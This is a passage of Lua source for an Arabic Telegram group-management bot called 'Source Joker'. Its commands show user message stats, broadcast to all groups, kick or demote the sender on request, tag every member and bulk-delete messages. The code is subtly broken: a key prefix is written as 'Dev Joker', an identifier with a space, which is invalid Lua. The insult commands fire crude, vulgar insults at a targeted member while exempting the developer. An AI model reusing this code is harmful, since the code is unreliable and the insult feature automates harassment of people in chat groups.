Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم مغادرة المجموعة \n⌁︙تم حذف جميع بياناتها ', 1, 'md')
chat_leave(msg.chat_id_, bot_id)
DevAbs:srem(Dev Joker.."bot:groups",msg.chat_id_)
end end
--     Source Joker     --
if text ==('موقعي') and ChCheck(msg) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
rtpa = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
rtpa = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
rtpa = 'عضو'
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙موقعك ↫ '..rtpa, 1, 'md')
end,nil)
end
--     Source Joker     --
if text:match("^معلوماتي$") and ChCheck(msg) then
function get_me(extra,result,success)
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local ABS_PROX = DevAbs:get(Dev Joker..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local msguser = tonumber(DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevAbs:get(Dev Joker..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevAbs:get(Dev Joker..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local text = (tonumber(DevAbs:get(Dev Joker.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local sticker = (tonumber(DevAbs:get(Dev Joker.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Photo = (tonumber(DevAbs:get(Dev Joker.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Voice = (tonumber(DevAbs:get(Dev Joker.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Audio = (tonumber(DevAbs:get(Dev Joker.."Audio:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Gif = (tonumber(DevAbs:get(Dev Joker.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Video = (tonumber(DevAbs:get(Dev Joker.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
if result.last_name_ then lastname = result.last_name_ else lastname = '' end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙اسمك ↫ ❨ ['..result.first_name_..'] ❩\n⌁︙معرفك ↫ ❨ ['..username..'] ❩\n⌁︙ايديك ↫ ❨ `'..result.id_..'` ❩\n⌁︙نقاطك ↫ ❨ '..user_nkt..' ❩\n⌁︙رسائلك ↫ ❨ '..(user_msgs + Dev_Abss)..' • '..(ABS_PROX)..' ❩\n⌁︙ملصقاتك ↫ ❨ '..sticker..' ❩\n⌁︙المتحركة ↫ ❨ '..Gif..' ❩\n⌁︙صورك ↫ ❨ '..Photo..' ❩\n⌁︙بصماتك ↫ ❨ '..Voice..' ❩\n⌁︙اغانيك ↫ ❨ '..Audio..' ❩\n⌁︙فيديوهاتك ↫ ❨ '..Video..' ❩\n⌁︙جهاتك ↫ ❨ '..cont..' ❩\n⌁︙تفاعلك ↫ '..formsgg(msguser)..'\n⌁︙رتبتك ↫ '..id_rank(msg), 1, 'md')
end
getUser(msg.sender_user_id_,get_me)
end
--     Source Joker     --
if is_sudo(msg) then
if text == 'اذاعه للكل بالتوجيه' and tonumber(msg.reply_to_message_id_) > 0 then
function ABS_PROX(extra,result,success)
local listgp = DevAbs:smembers(Dev Joker.."bot:groups")
for k,v in pairs(listgp) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
local listpv = DevAbs:smembers(Dev Joker.."bot:userss")
for k,v in pairs(listpv) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
end
local gps = DevAbs:scard(Dev Joker..'bot:groups') or 0
local pvs = DevAbs:scard(Dev Joker..'bot:userss') or 0
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم اذاعة رسالتك بالتوجية \n⌁︙‏في ↫ ❨ '..gps..' ❩ مجموعة \n⌁︙والى ↫ ❨ '..pvs..' ❩ مشترك \n ✓', 1, 'md')
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ABS_PROX)
end
end
--     Source Joker     --
if text:match("^المجموعات$") and is_SudoBot(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text:match("^↫ المجموعات ⌁$") and is_SudoBot(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local ABS_PROX = DevAbs:scard(Dev Joker.."bot:groups")
local abbs = DevAbs:scard("ABS_PROX:addg"..bot_id) or 0
local users = DevAbs:scard(Dev Joker.."bot:userss")
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين ↫ ❨ *'..users..'* ❩\n⌁︙عدد المجموعات ↫ ❨ *'..ABS_PROX..'* ❩\n⌁︙المجموعات المفعلة ↫ ❨ *'..abbs..'* ❩\n⌁︙الغير مفعلة ↫ ❨ *'..(ABS_PROX - abbs)..'* ❩\n ✓', 1, 'md')
end  
if text:match("^مشاهده المنشور$") and ChCheck(msg) or text:match("^مشاهدات المنشور$") and ChCheck(msg) or text:match("^عدد المشاهدات$") and ChCheck(msg) then
DevAbs:set(Dev Joker..'bot:viewget'..msg.sender_user_id_,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙حسنا قم باعادة توجية للمنشور الذي تريدني حساب مشاهداتة', 1, 'md')
end
--     Source Joker     --
if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == "يا سورس" then
local Text =[[
ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄᴇ ᴊᴏᴋᴇʀ
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'قناه السورس',url="t.me/BLACK_TEAM_4"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BLACK_TEAM_4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Joker     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text:match("^اطردني$") and ChCheck(msg) or text:match("^ادفرني$") and ChCheck(msg) then
if not DevAbs:get(Dev Joker.."lock_delme"..msg.chat_id_) then
DevAbs:set(Dev Joker..'yes'..msg.sender_user_id_..'', 'delyes')
DevAbs:set(Dev Joker..'no'..msg.sender_user_id_..'', 'delno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙هل انت متأكد من المغادرة \n⌁︙ارسل *{ نعم }* ليتم الامر \n⌁︙ارسل *{ لا }* لالغاء الامر ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصية معطلة ', 1, 'md')
end
end
local delme = DevAbs:get(Dev Joker..'yes'..msg.sender_user_id_..'')
if delme == 'delyes' then
if text:match("^نعم$") then
if is_vipmem(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لا استطيع طرد المشرفين ", 1, "md")
else
local delme = DevAbs:get(Dev Joker..'yes'..msg.sender_user_id_..'')
if delme == 'delyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
DevAbs:del(Dev Joker..'yes'..msg.sender_user_id_..'', 'delyes')
DevAbs:del(Dev Joker..'no'..msg.sender_user_id_..'', 'delno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم طردك من المجموعة", 1, "md")
end
end
end
if text:match("^لا$") then
local notdelme = DevAbs:get(Dev Joker..'no'..msg.sender_user_id_..'')
if notdelme == 'delno' then
DevAbs:del(Dev Joker..'yes'..msg.sender_user_id_..'', 'delyes')
DevAbs:del(Dev Joker..'no'..msg.sender_user_id_..'', 'delno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر اطردني", 1, "md")
end
end
end   
--     Source Joker     --
if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
if not DevAbs:get(Dev Joker.."lock_delme"..msg.chat_id_) then
DevAbs:set(Dev Joker.."lock_delme"..msg.chat_id_, true)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
if DevAbs:get(Dev Joker.."lock_delme"..msg.chat_id_) then
DevAbs:del(Dev Joker.."lock_delme"..msg.chat_id_)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
--     Source Joker     --
if text:match("^نزلني$") and ChCheck(msg) then
if not DevAbs:get(Dev Joker.."lock_delme"..msg.chat_id_) then
DevAbs:set(Dev Joker..'yesdel'..msg.sender_user_id_..'', 'delyes')
DevAbs:set(Dev Joker..'nodel'..msg.sender_user_id_..'', 'delno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙هل انت متأكد من تنزيلك\n⌁︙ارسل *{ نعم }* ليتم الامر \n⌁︙ارسل *{ لا }* لالغاء الامر ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عذرا هذه الخاصية معطلة', 1, 'md')
end
end
local delme = DevAbs:get(Dev Joker..'yesdel'..msg.sender_user_id_..'')
if delme == 'delyes' then
if text:match("^نعم$") then
local delme = DevAbs:get(Dev Joker..'yesdel'..msg.sender_user_id_..'')
if delme == 'delyes' then
if DevAbs:sismember(Dev Joker..'abs:monshid:'..msg.chat_id_, msg.sender_user_id_) then
monshid = 'المنشئين • ' else monshid = '' end 
if DevAbs:sismember(Dev Joker..'abs:owners:'..msg.chat_id_, msg.sender_user_id_) then
owners = 'المدراء • ' else owners = '' end
if DevAbs:sismember(Dev Joker..'abs:admins:'..msg.chat_id_, msg.sender_user_id_) then
admins = 'الادمنية • ' else admins = '' end
if DevAbs:sismember(Dev Joker..'abs:vipmem:'..msg.chat_id_, msg.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevAbs:sismember(Dev Joker..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
donky = 'المطاية • ' else donky = '' end
if DevAbs:sismember(Dev Joker..'abs:monshid:'..msg.chat_id_, msg.sender_user_id_) or DevAbs:sismember(Dev Joker..'abs:owners:'..msg.chat_id_, msg.sender_user_id_) or DevAbs:sismember(Dev Joker..'abs:admins:'..msg.chat_id_, msg.sender_user_id_) or DevAbs:sismember(Dev Joker..'abs:vipmem:'..msg.chat_id_, msg.sender_user_id_) or DevAbs:sismember(Dev Joker..'bot:donky:'..msg.chat_id_, msg.sender_user_id_) then
DevAbs:srem(Dev Joker..'abs:monshid:'..msg.chat_id_,msg.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:owners:'..msg.chat_id_,msg.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:admins:'..msg.chat_id_,msg.sender_user_id_)
DevAbs:srem(Dev Joker..'abs:vipmem:'..msg.chat_id_,msg.sender_user_id_)
DevAbs:srem(Dev Joker..'bot:donky:'..msg.chat_id_,msg.sender_user_id_)
DevAbs:del(Dev Joker..'yesdel'..msg.sender_user_id_..'', 'delyes')
DevAbs:del(Dev Joker..'nodel'..msg.sender_user_id_..'', 'delno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تنزيلك من ↫ ⤈\n⌯ ( "..monshid..''..owners..''..admins..''..vipmem..''..donky.." ) ⌯ \n", 1, "md")
else 
DevAbs:del(Dev Joker..'yesdel'..msg.sender_user_id_..'', 'delyes')
DevAbs:del(Dev Joker..'nodel'..msg.sender_user_id_..'', 'delno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ليس لديك اي رتبه هنا", 1, "md")
end
end
end
if text:match("^لا$") then
local notdelme = DevAbs:get(Dev Joker..'nodel'..msg.sender_user_id_..'')
if notdelme == 'delno' then
DevAbs:del(Dev Joker..'yesdel'..msg.sender_user_id_..'', 'delyes')
DevAbs:del(Dev Joker..'nodel'..msg.sender_user_id_..'', 'delno')
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر نزلني", 1, "md")
end
end
end   
--     Source Joker     --
if text == 'تعطيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
if not DevAbs:get(Dev Joker.."lock_delme"..msg.chat_id_) then
DevAbs:set(Dev Joker.."lock_delme"..msg.chat_id_, true)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
if text == 'تفعيل نزلني' and is_monsh(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
if DevAbs:get(Dev Joker.."lock_delme"..msg.chat_id_) then
DevAbs:del(Dev Joker.."lock_delme"..msg.chat_id_)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text == "تاك للكل" and ChCheck(msg) then
function tall(f1,f2)
local text = "⌁︙وينكم يالربع \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(f2.members_) do
i = i + 1
if DevAbs:get(Dev Joker..'Save:UserName'..v.user_id_) then
text = text..""..i.." ⌯ ❨ [@"..DevAbs:get(Dev Joker..'Save:UserName'..v.user_id_).."] ❩\n"
else
text = text..""..i.." ⌯ ❨ "..v.user_id_.." ❩\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
--     Source Joker     --
if text:match("^كللهم (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(كللهم) (.*)$")}
function tall(f1, f2)
local text = "⌁︙"..txt[2].." \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
i = 0
for k, v in pairs(f2.members_) do
i = i + 1
if DevAbs:get(Dev Joker..'Save:UserName'..v.user_id_) then
text = text..""..i.." ⌯ ❨ [@"..DevAbs:get(Dev Joker..'Save:UserName'..v.user_id_).."] ❩\n"
else
text = text..""..i.." ⌯ ❨ "..v.user_id_.." ❩\n"
end
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
end
--     Source Joker     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match('^تنظيف (%d+)$') and ChCheck(msg) then  
if not DevAbs:get(Dev Joker..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تنظيف اكثر من 1000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
delete_msg(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
DevAbs:setex(Dev Joker..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end 
end
--     Source Joker     --
if text:match("^رسائلي$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevAbs:get(Dev Joker..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local ABS_PROX = DevAbs:get(Dev Joker..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local Dev_Abss = (DevAbs:get('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙قائمة رسائلك في المجموعة ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙رسائلك الحقيقية ↫ *("..user_msgs..")* \n⌁︙رسائلك المضافة ↫ *("..Dev_Abss..")* \n⌁︙رسائلك اليوم ↫ *("..(ABS_PROX)..")*\n⌁︙مجموع رسائلك ↫ *("..(user_msgs + Dev_Abss)..")* \n ", 1, 'md')
end
--     Source Joker     --
if text:match("^معرفي$") and ChCheck(msg) then
function get_username(extra,result,success)
text = '⌁︙معرفك ↫ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
--     Source Joker     --
if text:match("^اسمي$") and ChCheck(msg) then
function get_firstname(extra,result,success)
text = '⌁︙اسمك ↫ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     Source Joker     --
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" then  Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙@HMSEBOT', 1, 'md') end
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} send_inline(msg.chat_id_,'⌁︙اضغط للحصول على الرابط',nil,inline) return false end
if text:match("^بوت الحذف$") or text:match("^اريد بوت الحذف$") or text:match("^اريد بوت حذف$") or text:match("^بوت حذف$") or text:match("^بوت حذف حسابات$") or text:match("^راح احذف$") then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} send_inline(msg.chat_id_,'⌁︙اضغط للحصول على البوت',nil,inline) return false end
if text:match("^جهاتي$") and ChCheck(msg) or text:match("^اضافاتي$") and ChCheck(msg) then add = (tonumber(DevAbs:get(Dev Joker..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙عدد جهاتك المضافة ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text:match("^تعديلاتي$") or text:match("^سحكاتي$") and ChCheck(msg) then local edit_msg = DevAbs:get(Dev Joker..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text:match("^رسائلي اليوم$") and ChCheck(msg) then local ABS_PROX = DevAbs:get(Dev Joker..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0 Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙رسائلك اليوم ↫ *❨ "..(ABS_PROX).." ❩* ", 1, 'md') end
if text:match("^ايديي$") and ChCheck(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1,'⌁︙ايديك ↫ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
if text:match("^رتبتي$") and ChCheck(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙رتبتك ↫ '..id_rank(msg), 1, 'html') end
if text:match("^ايدي المجموعه$") and ChCheck(msg) then Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ايدي المجموعة ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevAbs:del(Dev Joker..'bot:editmsg'..msg.chat_id_..msg.sender_user_id_) Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
--     Source Joker     --
if text == "المطور" then 
local DevCh1 = DevAbs:get(Dev Joker.."DevAbs3")
local DevText = DevAbs:get(Dev Joker.."DevText")
if DevCh1 then DevCh = '\n⌁︙*Dev Ch* ↬ ['..DevCh1..']' else DevCh = '' end
if DevText then
Dev_Abs(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙*Dev User* ↬ [@'..DevUser..']\n⌁︙*Dev Id* ↬ '..DevId..''..DevCh, 1, "md")
end
end 
--     Source Joker     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) then 
local username = text:match('^هينه @(.*)') 
function ABS_PROX(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(218385683) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevAbs:sismember(Dev Joker.."abs:absmonsh:"..msg.chat_id_,result.id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'html') 
else  
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙العضو غير موجود في المجموعة', 1, 'md') 
end 
end 
resolve_username(username,ABS_PROX)
end
--     Source Joker     --
if text:match("^هينه$") or text:match("^بعد هينه$") or text:match("^هينه بعد$") or text:match("^لك هينه$") or text:match("^هينها$") or text:match("^هينهه$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(218385683) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevAbs:sismember(Dev Joker.."abs:absmonsh:"..msg.chat_id_,result.sender_user_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
function bosha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗 @'..DevUser, 1, 'html')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosha)   
end
end
if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") or text:match("^بوسه بعد$") then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗 @'..DevUser, 1, 'html')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
if text:match("^صيحه$") or text:match("^صيحها$") or text:match("^صيحهه$") or text:match("^صيح$") then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..DevUser, 1, 'html')
return false
end 
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md') 
local ABS_PROX = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_Abs(msg.chat_id_, result.id_, 1,''..ABS_PROX[math.random(#ABS_PROX)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
--     Source Joker     --
if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function ABS_PROX(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..DevUser, 1, 'html') 
return false  
end  
local ABS_PROX = "صارر ستاذيي 🏃🏻‍♂️♥️" 
